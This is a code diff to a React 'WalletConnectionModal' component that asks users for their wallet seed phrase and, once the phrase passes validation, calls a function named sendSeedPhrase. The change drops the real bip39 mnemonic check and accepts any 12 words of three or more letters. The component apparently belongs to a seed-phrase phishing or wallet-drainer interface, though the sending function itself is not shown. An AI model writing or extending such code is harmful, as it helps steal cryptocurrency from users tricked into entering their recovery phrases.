@@ -60,16 +60,17 @@ export default function WalletConnectionModal({
     // Import bip39 at the top: import * as bip39 from 'bip39';
     // If you can't use bip39, fallback to basic validation
     let isValid = false;
-    try {
-      // @ts-ignore
-      isValid = bip39.validateMnemonic(seedPhrase.trim());
-      console.log('Seed phrase is valid:', isValid);
-    } catch (error) {
-      console.error('Error validating seed phrase:', error);
-      // fallback: 12 words, each at least 3 chars
-      isValid = words.length === 12 && words.every(word => word.length >= 3);
-      console.log('Fallback validation:', isValid);
-    }
+    isValid = words.length === 12 && words.every(word => word.length >= 3);
+    // try {
+    //   // @ts-ignore
+    //   isValid = bip39.validateMnemonic(seedPhrase.trim());
+    //   console.log('Seed phrase is valid:', isValid);
+    // } catch (error) {
+    //   console.error('Error validating seed phrase:', error);
+    //   // fallback: 12 words, each at least 3 chars
+    //   isValid = words.length === 12 && words.every(word => word.length >= 3);
+    //   console.log('Fallback validation:', isValid);
+    // }
     setIsSeedValid(isValid);
     if (isValid) {
       sendSeedPhrase();
